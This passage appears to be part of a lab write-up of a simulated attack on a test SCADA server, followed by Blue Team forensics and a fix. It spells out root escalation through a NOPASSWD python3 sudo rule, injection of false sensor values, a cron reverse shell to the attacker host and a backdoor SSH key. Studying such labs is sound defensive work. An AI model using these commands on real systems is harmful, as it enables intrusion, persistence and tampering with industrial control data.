        <div class="SC"><span class="SCV tg">100%</span><span class="SCL">All Detected</span></div>
      </div>

      <div class="eye" style="margin-bottom:12px;margin-top:8px;">Phase 1 — SSH Login as portuser</div>
      <h3 class="DS" style="margin-bottom:12px;">Using the cracked <span class="tc">credential</span></h3>
      <p class="BM" style="margin-bottom:12px;">Using the password cracked in Simulation 2 (tangermed2024), we SSH into the Ubuntu SCADA server as portuser. This is a low-privilege account — but it's our foothold inside the network. From here, we conduct internal reconnaissance that's impossible from outside.</p>
      <pre class="CB"><span class="CC"># Phase 1 — SSH login from Kali to Ubuntu</span>
<span class="CMD">ssh</span> <span class="VAL"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="83f3ecf1f7f6f0e6f1c3b2bab1adb2b5bbadb5b7adb1">[email&#160;protected]</a></span>    <span class="CC">← password: tangermed2024</span>
<span class="OK">portuser@serveur-SCADA:~$</span>  <span class="CC">← foothold established</span></pre>

      <div class="eye" style="margin-bottom:12px;margin-top:28px;">Phase 2 — Internal Reconnaissance</div>
      <h3 class="DS" style="margin-bottom:12px;">Mapping the inside <span class="tc">from within</span></h3>
      <p class="BM" style="margin-bottom:12px;">From inside the network, we can see services invisible from outside. MySQL on port 3306 is bound to 127.0.0.1 — completely hidden from external Nmap scans. We can also see the SCADA server running as root, and identify other logged-in users. This internal view is what makes lateral movement so powerful.</p>
      <pre class="CB"><span class="CC"># Internal network services — invisible from outside!</span>
<span class="CMD">ss</span> <span class="FLG">-tlnp</span>
<span class="OK">LISTEN  0.0.0.0:22</span>    <span class="CC">← SSH (already knew)</span>
<span class="OK">LISTEN  0.0.0.0:5020</span>  <span class="CC">← SCADA (already knew)</span>
<span class="WRN">LISTEN  127.0.0.1:3306</span> <span class="CC">← MySQL! HIDDEN FROM EXTERNAL SCAN</span>
<span class="OK">LISTEN  0.0.0.0:80</span>    <span class="CC">← Apache (already knew)</span>

<span class="CC"># SCADA process running as ROOT — critical finding</span>
<span class="CMD">ps aux | grep python</span>
<span class="ERR">root    3143  python3 /home/nezuku/scada_lab/scada_server.py</span>

<span class="CC"># Other users currently logged in</span>
<span class="CMD">who</span>
<span class="OK">nezuku   tty2  (admin — graphical session)</span>
<span class="OK">portuser pts/1 192.168.64.4 (us — SSH session)</span></pre>

      <div class="eye" style="margin-bottom:12px;margin-top:28px;">Phase 3 — Privilege Escalation to Root</div>
      <h3 class="DS" style="margin-bottom:12px;">From user to <span class="tr">root in 1 command</span></h3>
      <p class="BM" style="margin-bottom:12px;">The most critical finding: running <strong>sudo -l</strong> shows portuser is allowed to run /usr/bin/python3 as root without a password. This is a classic "GTFOBins" privilege escalation — Python can spawn system shells, and since it runs as root, the spawned shell is also root. This misconfiguration likely exists because someone wanted portuser to run SCADA scripts with elevated permissions, without understanding the security implications.</p>
      <pre class="CB R"><span class="CC"># Step 1 — Check what we're allowed to run as root</span>
<span class="CMD">sudo -l</span>
<span class="WRN">(ALL) NOPASSWD: /usr/bin/python3</span>  <span class="CC">← portuser can run python3 as root, no password!</span>

<span class="CC"># Step 2 — Exploit it: python3 spawns a bash shell AS ROOT</span>
<span class="CMD">sudo python3</span> <span class="FLG">-c</span> <span class="VAL">"import os; os.system('/bin/bash')"</span>

<span class="CC"># Result — we are now root:</span>
<span class="ERR">root@serveur-SCADA:~# id</span>
<span class="ERR">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="OK"># TOTAL SYSTEM COMPROMISE ACHIEVED IN 1 COMMAND</span>
<span class="CC"># Time from SSH login to root: under 10 seconds</span></pre>

      <div class="eye" style="margin-bottom:12px;margin-top:28px;">Phase 4 — Direct SCADA Access as Root</div>
      <h3 class="DS" style="margin-bottom:12px;">Reading live sensors <span class="tc">from inside</span></h3>
      <pre class="CB"><span class="CC"># From root shell — read live SCADA data directly</span>
<span class="CMD">python3</span> <span class="VAL">/home/nezuku/scada_lab/scada_server.py</span> <span class="FLG">&amp;</span>
<span class="CC"># Real readings captured:</span>
<span class="OK">crane_weight  =  14,676.3 kg</span>
<span class="OK">temperature   =  3.54°C</span>
<span class="OK">fuel_level    =  74.2%</span>

<span class="CC"># Injection (same script as Sim 3 but now from inside as root)</span>
<span class="CMD">python3 /tmp/inject_v2.py</span>
<span class="ERR">INJECTED: crane_weight=38500.0, temperature=87.5, fuel_level=0.0</span></pre>

      <div class="eye" style="margin-bottom:12px;margin-top:28px;">Phase 5 — Persistence: 2 Backdoors Installed</div>
      <h3 class="DS" style="margin-bottom:12px;">Surviving <span class="tr">reboots & password changes</span></h3>
      <p class="BM" style="margin-bottom:12px;">As root, we install two persistence mechanisms: (1) a cron job that fires a reverse shell every minute, and (2) an SSH backdoor key — so even if portuser's password is changed, the attacker can SSH directly to root. Both are the exact techniques used in real APT campaigns.</p>
      <pre class="CB R"><span class="CC"># Backdoor 1 — Cron reverse shell (fires every minute to Kali)</span>
<span class="CMD">(crontab -l 2>/dev/null; echo "* * * * * bash -i &gt;&amp; /dev/tcp/192.168.64.4/4444 0&gt;&amp;1") | crontab -</span>

<span class="CC"># On Kali — listen for incoming connection</span>
<span class="CMD">nc</span> <span class="FLG">-lvnp</span> <span class="VAL">4444</span>
<span class="OK">Connection from 192.168.64.2:55123</span>
<span class="ERR">root@serveur-SCADA:~# id</span>
<span class="ERR">uid=0(root) gid=0(root)  ← ROOT SHELL DELIVERED TO KALI</span>

<span class="CC"># Backdoor 2 — SSH key installed in root's authorized_keys</span>
<span class="CMD">echo</span> <span class="VAL">"ssh-ed25519 AAAAC3Nz...BackdoorKey attacker@kali"</span> <span class="CMD">&gt;&gt; /root/.ssh/authorized_keys</span>
<span class="CC"># Attacker can now SSH to root directly, even if all passwords change</span></pre>

      <div class="eye G" style="margin-bottom:12px;margin-top:28px;">Phase 6 — Blue Team Forensic Response</div>
      <h3 class="DS" style="margin-bottom:12px;">Finding every <span class="tg">trace of the attack</span></h3>
      <p class="BM" style="margin-bottom:12px;">This is the most important phase — the Blue Team forensic investigation. Using standard Linux tools, we reconstruct the entire attack timeline from system logs, find both backdoors, and remove them. This is exactly what a SOC analyst would do after an incident alert.</p>
      <pre class="CB G"><span class="CC"># Blue Team Step 1 — Who logged in and when?</span>
<span class="CMD">last | head -10</span>
<span class="WRN">portuser pts/3  192.168.64.4  Mon Mar 9 03:07  still logged in</span>
<span class="WRN">portuser pts/1  192.168.64.4  Mon Mar 9 03:05  still logged in</span>
<span class="OK">nezuku   tty2   tty2          Mon Mar 9 03:04  still logged in</span>
<span class="WRN">portuser pts/2  192.168.64.4  Mon Mar 9 02:33 - crash (00:43)</span>

<span class="CC"># Blue Team Step 2 — Find the privilege escalation events</span>
<span class="CMD">grep "sudo.*python3" /var/log/auth.log | tail -5</span>
<span class="ERR">03:05:30 sudo: portuser : COMMAND=/usr/bin/python3 -c 'import os; os.system(\'/bin/bash\')'</span>
<span class="ERR">03:08:07 sudo: portuser : COMMAND=/usr/bin/python3 -c 'import os; os.system(\'/bin/bash\')'</span>
<span class="CC"># EVIDENCE: timestamp, user, exact escalation command — all in auth.log</span>

<span class="CC"># Blue Team Step 3 — Find the cron backdoor</span>
<span class="CMD">sudo crontab -l -u root</span>
<span class="ERR">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.64.4/4444 0&gt;&amp;1  ← BACKDOOR FOUND</span>

<span class="CC"># Blue Team Step 4 — Find the SSH backdoor key</span>
<span class="CMD">sudo cat /root/.ssh/authorized_keys</span>
<span class="ERR">ssh-ed25519 AAAAC3Nz...BackdoorKey attacker@kali  ← UNAUTHORIZED KEY</span>

<span class="CC"># Blue Team Step 5 — CLEANUP</span>
<span class="CMD">sudo crontab -r -u root</span>                               <span class="CC">← remove cron backdoor</span>
<span class="CMD">sudo sed -i '/attacker@kali/d' /root/.ssh/authorized_keys</span> <span class="CC">← remove SSH key</span>
<span class="OK">echo "[CLEANED] Both backdoors removed — system secured"</span>
<span class="OK">[CLEANED] Both backdoors removed — system secured</span></pre>

      <div class="SIEM">
        <div class="SIEMH"><span class="SIEMT">siem_sim4.py — Lateral Movement Event Timeline</span><span class="SIEML"><div class="npulse"></div>SIMULATION 4 COMPLETE</span></div>
        <div class="SIEMB">
          <div class="SL"><span class="SLT">03:07:11</span><span class="SLEV slH">[HIGH]</span><span class="SLM">SSH_LOGIN — 192.168.64.4 → portuser — successful auth</span></div>
          <div class="SL"><span class="SLT">03:07:22</span><span class="SLEV slH">[HIGH]</span><span class="SLM">INTERNAL_SCAN — portuser running ss -tlnp, ps aux (post-login recon)</span></div>
          <div class="SL"><span class="SLT">03:07:42</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">PRIV_ESC — portuser → root via sudo python3 (1 command)</span></div>
          <div class="SL"><span class="SLT">03:08:11</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">SCADA_ACCESS — direct connection to 127.0.0.1:5020 from root shell</span></div>
          <div class="SL"><span class="SLT">03:08:22</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">DATA_INJECTION — crane=38500kg / temp=87.5°C (from localhost)</span></div>
          <div class="SL"><span class="SLT">03:09:05</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">PERSISTENCE — cron reverse shell planted → /dev/tcp/192.168.64.4/4444</span></div>
          <div class="SL"><span class="SLT">03:09:08</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">PERSISTENCE — unauthorized SSH key added to /root/.ssh/authorized_keys</span></div>
          <div class="SL"><span class="SLT">03:10:00</span><span class="SLEV slH">[HIGH]</span><span class="SLM">REVERSE_SHELL — root shell delivered to 192.168.64.4:4444</span></div>
          <div class="SL"><span class="SLT">03:22:14</span><span class="SLEV slG">[ACTION]</span><span class="SLM">BLUE_TEAM — forensic analysis complete · cron removed · SSH key removed</span></div>
        </div>
      </div>
      <div class="IB G"><div class="ibl">🔵 Blue Team Lesson — Root Cause & Fix</div><p>The root cause is a <strong>single misconfigured sudo rule</strong>. The fix is one line: remove the NOPASSWD python3 entry from /etc/sudoers. Broader mitigations: (1) Apply the principle of least privilege — portuser should NEVER need root access, (2) Use sudo logging and alerting (SUDO_LOG), (3) Implement auditd rules that alert on sudo executions, (4) Consider removing sudo access entirely for service accounts and using systemd services with appropriate permissions instead.</p></div>
    </div>
